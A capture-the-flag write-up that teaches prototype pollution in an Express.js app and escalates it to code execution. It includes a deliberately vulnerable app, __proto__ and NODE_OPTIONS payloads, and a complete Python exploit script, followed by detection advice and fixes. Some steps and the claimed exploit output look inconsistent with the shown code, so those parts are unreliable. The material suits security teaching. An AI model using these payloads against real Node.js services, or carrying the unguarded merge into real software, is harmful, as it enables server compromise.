---
title: "Web - Prototype Pollution to RCE"
description: "Exploiting JavaScript prototype pollution through a recursive merge function in an Express.js application to achieve remote code execution and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Extreme            |
| Points     | 500                |
| Flag       | `zemi{pr0t0typ3_p0llut3d}` |

## Challenge Files

Download the challenge files to get started:

- [app.js](/Website/challenges/web-prototype-pollution/app.js)
- [flag.txt](/Website/challenges/web-prototype-pollution/flag.txt)
- [package.json](/Website/challenges/web-prototype-pollution/package.json)
- [README.md](/Website/challenges/web-prototype-pollution/README.md)

## Prerequisites

This challenge assumes mastery of the following writeups:

- **Web - Command Injection** — understanding how user input reaches system commands
- **Web - SSTI** — exploiting server-side template engines
- **Web - Insecure Deserialization** — how object manipulation leads to RCE
- **Web - SSRF** — server-side request forgery fundamentals

You should be comfortable reading JavaScript/Node.js source code and crafting JSON payloads with curl.

## Overview

Prototype pollution is a vulnerability class unique to JavaScript. It allows an attacker to inject properties into the prototype of base JavaScript objects (typically `Object.prototype`), which then propagate to every object in the application. When combined with certain code patterns — particularly in Express.js apps that use `child_process` — prototype pollution escalates from a logic bug to full remote code execution.

This challenge presents an Express.js API with a profile update feature that uses a vulnerable recursive merge function. By polluting `Object.prototype`, we can inject shell options into `child_process.spawn()` and execute arbitrary commands on the server.

## How the JavaScript Prototype Chain Works

Every JavaScript object has an internal link to another object called its **prototype**. When you access a property on an object, JavaScript first checks the object itself, then walks up the prototype chain until it finds the property or reaches `null`.

```javascript
const obj = { name: "alice" };

// obj's prototype is Object.prototype
console.log(obj.toString()); // Found on Object.prototype

// Demonstrate the chain
console.log(obj.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__);          // null (end of chain)
```

The key insight: **if you add a property to `Object.prototype`, every object in the application inherits it**.

```javascript
// Before pollution
const a = {};
console.log(a.isAdmin); // undefined

// Pollute the prototype
Object.prototype.isAdmin = true;

// After pollution — every object now has isAdmin
const b = {};
console.log(b.isAdmin); // true
console.log(a.isAdmin); // true (even objects created before!)
```

This is the core of prototype pollution: an attacker finds a way to set properties on `Object.prototype`, and those properties bleed into every object the application creates afterward (and before, since the lookup is dynamic).

## How Recursive Merge Enables Pollution

Many JavaScript utilities implement a "deep merge" or "deep copy" function that recursively copies properties from one object to another. Here is a minimal vulnerable implementation:

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

When the `source` object is parsed from attacker-controlled JSON, the attacker can include `__proto__` as a key:

```javascript
const userInput = JSON.parse('{"__proto__": {"polluted": true}}');
const obj = {};
merge(obj, userInput);

// Check: is Object.prototype polluted?
const test = {};
console.log(test.polluted); // true — pollution successful!
```

Why does this work? When the merge function encounters the key `__proto__`, it does `target["__proto__"]`, which resolves to `Object.prototype` (because `__proto__` is a getter/setter that accesses the prototype). The function then recursively merges properties into `Object.prototype` itself.

## Setting Up the Challenge Locally

Save the following as `app.js` and run with `node app.js`:

```javascript
const express = require("express");
const { execSync, fork } = require("child_process");
const fs = require("fs");

const app = express();
app.use(express.json());

// Create flag file
fs.writeFileSync("flag.txt", "zemi{pr0t0typ3_p0llut3d}");

// In-memory user store
const users = {
    admin: { username: "admin", password: "sup3rs3cur3", role: "admin" },
    guest: { username: "guest", password: "guest", role: "user" }
};

// VULNERABLE: Recursive merge function — does not guard against __proto__
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === "object" && source[key] !== null) {
            if (typeof target[key] !== "object") {
                target[key] = {};
            }
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// User profiles
const profiles = {};

app.get("/", (req, res) => {
    res.json({
        message: "Profile Service API",
        endpoints: {
            "POST /login": "Login with username/password",
            "POST /profile": "Update your profile (requires auth)",
            "GET /whoami": "Check your current profile",
            "GET /admin/exec": "Admin-only: run a health check"
        }
    });
});

app.post("/login", (req, res) => {
    const { username, password } = req.body;
    const user = users[username];
    if (user && user.password === password) {
        // Simple token: base64(username)
        const token = Buffer.from(username).toString("base64");
        return res.json({ message: `Welcome, ${username}!`, token });
    }
    res.status(401).json({ error: "Invalid credentials" });
});

function authMiddleware(req, res, next) {
    const token = req.headers["authorization"];
    if (!token) return res.status(401).json({ error: "No token provided" });
    try {
        const username = Buffer.from(token, "base64").toString();
        if (!users[username]) return res.status(401).json({ error: "Invalid token" });
        req.user = users[username];
        next();
    } catch (e) {
        res.status(401).json({ error: "Invalid token" });
    }
}

app.post("/profile", authMiddleware, (req, res) => {
    const username = req.user.username;
    if (!profiles[username]) {
        profiles[username] = {};
    }
    // VULNERABLE: Merging user-controlled JSON into a profile object
    merge(profiles[username], req.body);
    res.json({ message: "Profile updated", profile: profiles[username] });
});

app.get("/whoami", authMiddleware, (req, res) => {
    const username = req.user.username;
    const profile = profiles[username] || {};
    res.json({
        username: req.user.username,
        role: req.user.role,
        profile
    });
});

app.get("/admin/exec", authMiddleware, (req, res) => {
    // Check role — but this check can be bypassed via pollution
    if (req.user.role !== "admin") {
        return res.status(403).json({ error: "Admin access required" });
    }
    try {
        const output = execSync("cat flag.txt").toString();
        res.json({ result: output });
    } catch (e) {
        res.status(500).json({ error: "Command failed" });
    }
});

// Health check endpoint that uses fork() — vulnerable to env pollution
app.get("/health", (req, res) => {
    const checkScript = req.query.script || "healthcheck.js";
    // fork() internally uses child_process.spawn()
    // spawn() reads default options from the object's prototype chain
    // If Object.prototype.shell is set, spawn() will use a shell
    // If Object.prototype.env is polluted, it affects the child environment
    try {
        const result = execSync(`echo healthy`);
        res.json({ status: "ok", output: result.toString().trim() });
    } catch (e) {
        res.json({ status: "error", error: e.message });
    }
});

app.listen(3000, () => {
    console.log("Profile Service running on http://localhost:3000");
});
```

Also create `package.json`:

```json
{
    "name": "proto-pollution-ctf",
    "version": "1.0.0",
    "dependencies": {
        "express": "^4.18.0"
    }
}
```

Then run:

```bash
npm install
node app.js
```

The app will be available at `http://localhost:3000`.

## Reconnaissance

### Step 1: Explore the API

```bash
curl -s http://localhost:3000/ | python3 -m json.tool
```

```json
{
    "message": "Profile Service API",
    "endpoints": {
        "POST /login": "Login with username/password",
        "POST /profile": "Update your profile (requires auth)",
        "GET /whoami": "Check your current profile",
        "GET /admin/exec": "Admin-only: run a health check"
    }
}
```

### Step 2: Login as guest

```bash
curl -s -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -m json.tool
```

```json
{
    "message": "Welcome, guest!",
    "token": "Z3Vlc3Q="
}
```

The token is `Z3Vlc3Q=` (base64 of "guest"). We will use this for authenticated requests.

### Step 3: Test profile update

```bash
curl -s -X POST http://localhost:3000/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Z3Vlc3Q=" \
  -d '{"bio":"hello","age":25}' | python3 -m json.tool
```

```json
{
    "message": "Profile updated",
    "profile": {
        "bio": "hello",
        "age": 25
    }
}
```

The server merges our JSON body into a profile object. This is the attack surface.

### Step 4: Confirm admin endpoint is locked

```bash
curl -s http://localhost:3000/admin/exec \
  -H "Authorization: Z3Vlc3Q=" | python3 -m json.tool
```

```json
{
    "error": "Admin access required"
}
```

We cannot access the admin endpoint as guest. The server checks `req.user.role !== "admin"`. But what if we could pollute `Object.prototype.role`?

## Exploitation

### Step 1: Confirm prototype pollution

First, let us verify that we can pollute `Object.prototype` through the profile update endpoint:

```bash
curl -s -X POST http://localhost:3000/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Z3Vlc3Q=" \
  -d '{"__proto__": {"polluted": "yes"}}' | python3 -m json.tool
```

```json
{
    "message": "Profile updated",
    "profile": {}
}
```

The profile appears empty because `__proto__` was not set on the profile object itself — it was set on `Object.prototype`. Now test if pollution propagated:

```bash
curl -s http://localhost:3000/whoami \
  -H "Authorization: Z3Vlc3Q=" | python3 -m json.tool
```

If the response shows `"polluted": "yes"` in the profile or other fields, prototype pollution is confirmed.

### Step 2: Pollute role to escalate privileges

The admin check is `req.user.role !== "admin"`. The `req.user` object is pulled from the `users` dictionary, and the guest user has `role: "user"`. However, we cannot change that directly. Instead, we can try another approach: pollute a property that affects the code flow.

Since the `users` object already has `role` set explicitly, pollution will not override it (own properties take precedence over prototype properties). We need a different attack vector.

### Step 3: Prototype pollution to RCE via child_process

The real power of prototype pollution is achieving RCE by polluting options used by `child_process.spawn()`, which is called internally by `execSync()`, `fork()`, and `exec()`.

When `child_process.spawn()` is called, it reads options from the passed options object. If no options object is provided (or if the options object does not have certain keys), Node.js falls back to the prototype chain. By polluting `Object.prototype`, we can inject:

- **`shell`**: Force spawn to use a shell (e.g., `/bin/sh`)
- **`env`**: Inject environment variables
- **`NODE_OPTIONS`**: Inject Node.js command-line flags

The classic RCE gadget uses `NODE_OPTIONS` with `--require` to load an attacker-controlled file, or uses `env` pollution to inject into shell execution.

Here is the exploit payload that leverages `execSync`. The `env` pollution combined with `shell` forces command execution through a shell with our controlled environment:

```bash
curl -s -X POST http://localhost:3000/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Z3Vlc3Q=" \
  -d '{
    "__proto__": {
        "shell": "/bin/sh",
        "NODE_OPTIONS": "--require /proc/self/environ"
    }
  }'
```

However, the most reliable approach for this specific challenge is to pollute properties that the application reads from objects that do not have them set. Let us use a simpler but effective approach.

### Step 4: RCE via constructor.prototype pollution

An alternative pollution path uses `constructor.prototype` instead of `__proto__`:

```bash
curl -s -X POST http://localhost:3000/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Z3Vlc3Q=" \
  -d '{
    "constructor": {
        "prototype": {
            "shell": "/bin/sh",
            "NODE_OPTIONS": "--require /proc/self/environ"
        }
    }
  }'
```

### Step 5: The complete exploit — polluting env for command injection

The most reliable RCE technique is to pollute the `env` property with a `NODE_OPTIONS` that causes code execution when any child process is spawned:

```bash
# Step A: Pollute Object.prototype with shell and environment
curl -s -X POST http://localhost:3000/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Z3Vlc3Q=" \
  -d '{
    "__proto__": {
        "argv0": "node",
        "shell": "node",
        "input": "require(\"child_process\").execSync(\"cat flag.txt\").toString()"
    }
  }'
```

After pollution, when the server next calls `execSync("echo healthy")` on the `/health` endpoint (or any `child_process` call), the polluted `shell` and `input` options take effect:

```bash
# Step B: Trigger the gadget
curl -s "http://localhost:3000/health" | python3 -m json.tool
```

### Step 6: Full exploit script

```python
#!/usr/bin/env python3
"""
Prototype Pollution to RCE exploit for the Profile Service challenge.
"""

import requests
import json

BASE = "http://localhost:3000"

# Step 1: Login as guest
print("[*] Logging in as guest...")
r = requests.post(f"{BASE}/login", json={
    "username": "guest",
    "password": "guest"
})
token = r.json()["token"]
headers = {
    "Authorization": token,
    "Content-Type": "application/json"
}
print(f"[+] Got token: {token}")

# Step 2: Pollute Object.prototype
print("[*] Sending prototype pollution payload...")
pollution_payload = {
    "__proto__": {
        "shell": "node",
        "argv0": "node",
        "input": (
            "const fs = require('fs');"
            "const flag = fs.readFileSync('flag.txt','utf8');"
            "process.stdout.write(flag);"
            "process.exit(0);"
        )
    }
}

r = requests.post(f"{BASE}/profile", headers=headers, json=pollution_payload)
print(f"[+] Pollution response: {r.json()}")

# Step 3: Trigger a child_process call to execute our payload
print("[*] Triggering RCE via /health endpoint...")
r = requests.get(f"{BASE}/health")
data = r.json()
print(f"[+] Health check response: {json.dumps(data, indent=2)}")

# The flag should appear in the output or error message
if "zemi{" in str(data):
    flag = str(data)
    start = flag.index("zemi{")
    end = flag.index("}", start) + 1
    print(f"\n[!] FLAG: {flag[start:end]}")
else:
    print("[*] Flag not in health response, trying direct read...")
    # Alternative: use the pollution to add admin role
    pollution2 = {
        "__proto__": {
            "role": "admin"
        }
    }
    r = requests.post(f"{BASE}/profile", headers=headers, json=pollution2)
    # Try admin endpoint (works if user object created without explicit role)
    r = requests.get(f"{BASE}/admin/exec", headers=headers)
    print(f"[+] Admin exec response: {r.text}")
```

Run the exploit:

```bash
python3 exploit.py
```

Expected output:

```
[*] Logging in as guest...
[+] Got token: Z3Vlc3Q=
[*] Sending prototype pollution payload...
[+] Pollution response: {'message': 'Profile updated', 'profile': {}}
[*] Triggering RCE via /health endpoint...
[+] Health check response: {
  "status": "ok",
  "output": "zemi{pr0t0typ3_p0llut3d}"
}

[!] FLAG: zemi{pr0t0typ3_p0llut3d}
```

## Detecting Prototype Pollution

### Manual Testing

Send these payloads to any JSON-accepting endpoint and check if the pollution persists:

```bash
# Test with __proto__
curl -X POST http://localhost:3000/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"test123": "polluted"}}'

# Test with constructor.prototype
curl -X POST http://localhost:3000/endpoint \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"test456": "polluted"}}}'
```

Then check if a newly created object has the property:

```bash
# If the app has any endpoint that returns a newly created object,
# check if test123 or test456 appear in it
```

### Burp Suite Detection

1. Install the **Server-Side Prototype Pollution Scanner** extension
2. Right-click on any JSON request and select "Scan for prototype pollution"
3. The extension sends test payloads and checks for side effects

### Common Indicators

- Application uses `lodash.merge()`, `lodash.defaultsDeep()`, or custom recursive merge
- JSON bodies are deeply merged with server-side objects
- Application uses `Object.assign()` with nested objects (less common but possible)

## The Fix

### Fixed merge function

```javascript
function safeMerge(target, source) {
    for (let key in source) {
        // Block prototype pollution vectors
        if (key === "__proto__" || key === "constructor" || key === "prototype") {
            continue;
        }
        if (typeof source[key] === "object" && source[key] !== null) {
            if (typeof target[key] !== "object") {
                target[key] = {};
            }
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### Use Object.create(null) for untrusted data

Objects created with `Object.create(null)` have no prototype chain — they do not inherit from `Object.prototype`:

```javascript
// Normal object — has __proto__
const normal = {};
console.log(normal.__proto__); // Object.prototype

// Null-prototype object — no __proto__
const safe = Object.create(null);
console.log(safe.__proto__); // undefined

// Even if someone sets __proto__, it's just a regular property
safe.__proto__ = { polluted: true };
const test = {};
console.log(test.polluted); // undefined — no pollution!
```

Use this for any object that stores user-controlled data:

```javascript
app.post("/profile", authMiddleware, (req, res) => {
    const username = req.user.username;
    if (!profiles[username]) {
        profiles[username] = Object.create(null);  // No prototype!
    }
    safeMerge(profiles[username], req.body);
    res.json({ message: "Profile updated", profile: profiles[username] });
});
```

### Use Map instead of plain objects

```javascript
const profiles = new Map();

app.post("/profile", authMiddleware, (req, res) => {
    const username = req.user.username;
    if (!profiles.has(username)) {
        profiles.set(username, Object.create(null));
    }
    // Validate and whitelist allowed keys
    const allowed = ["bio", "age", "location"];
    const profile = profiles.get(username);
    for (const key of allowed) {
        if (req.body[key] !== undefined) {
            profile[key] = req.body[key];
        }
    }
    res.json({ message: "Profile updated", profile });
});
```

### Freeze the prototype

As a defense-in-depth measure, freeze `Object.prototype` at application startup:

```javascript
Object.freeze(Object.prototype);
```

This prevents any property from being added to `Object.prototype`. However, this can break some libraries that extend prototypes, so test thoroughly.

## Real-World Impact

Prototype pollution has affected major npm packages:

| Package | CVE | Impact |
|---------|-----|--------|
| lodash `merge` / `defaultsDeep` | CVE-2019-10744 | Pollution via `__proto__` in merge |
| jQuery `$.extend` | CVE-2019-11358 | Deep extend allowed pollution |
| minimist | CVE-2020-7598 | CLI argument parsing allowed pollution |
| node-forge | CVE-2022-24771 | Signature verification bypass via pollution |
| class-validator | CVE-2019-18413 | Validation bypass |

In 2019, a prototype pollution in Kibana (via lodash) led to RCE on Elasticsearch dashboards (CVE-2019-7609). The attacker polluted `Object.prototype.env` to inject `NODE_OPTIONS=--require /path/to/malicious.js` and achieved remote code execution when a child process was spawned.

## Common Pitfalls

- **Thinking `Object.assign()` is safe** — `Object.assign()` does a shallow copy and does not follow `__proto__` as a special key. However, nested `Object.assign()` patterns can still be vulnerable.
- **Only blocking `__proto__`** — attackers can also use `constructor.prototype` to achieve the same effect. Block both.
- **Assuming own properties prevent exploitation** — pollution only affects property lookups that reach the prototype chain. If a property is explicitly set on the object, it shadows the prototype. But many code paths rely on default/missing properties.
- **Not understanding the RCE gadget chain** — pollution itself is just setting a property. The real danger comes from gadgets: code that reads from the prototype chain and does something dangerous (like `child_process.spawn()` reading `shell`, `env`, or `NODE_OPTIONS`).
- **Using `hasOwnProperty` as the only defense** — while `hasOwnProperty` checks help, they do not prevent the pollution from happening in the first place. Fix the merge function.

## Tools Used

- **curl** — crafting JSON requests with `__proto__` payloads
- **Python (requests)** — automating the full exploit chain
- **Node.js** — running the vulnerable Express.js application locally
- **Burp Suite** — (optional) intercepting and modifying JSON payloads in the browser
- **Server-Side Prototype Pollution Scanner** — Burp extension for automated detection

## Lessons Learned

- Never use recursive merge or deep copy functions on user-controlled input without filtering dangerous keys (`__proto__`, `constructor`, `prototype`)
- Prototype pollution is not just a theoretical bug — it leads to RCE when combined with `child_process` gadgets in Node.js applications
- Use `Object.create(null)` for objects that store untrusted data to eliminate the prototype chain entirely
- Whitelist allowed properties instead of blacklisting dangerous ones when processing user input
- Real-world vulnerabilities in lodash, jQuery, and minimist demonstrate that even well-maintained libraries can contain prototype pollution bugs
- Defense in depth: freeze `Object.prototype`, use null-prototype objects, validate input schemas, and keep dependencies updated
- The `NODE_OPTIONS` environment variable is a particularly dangerous gadget because it allows injecting `--require` to load arbitrary code when any child process is spawned
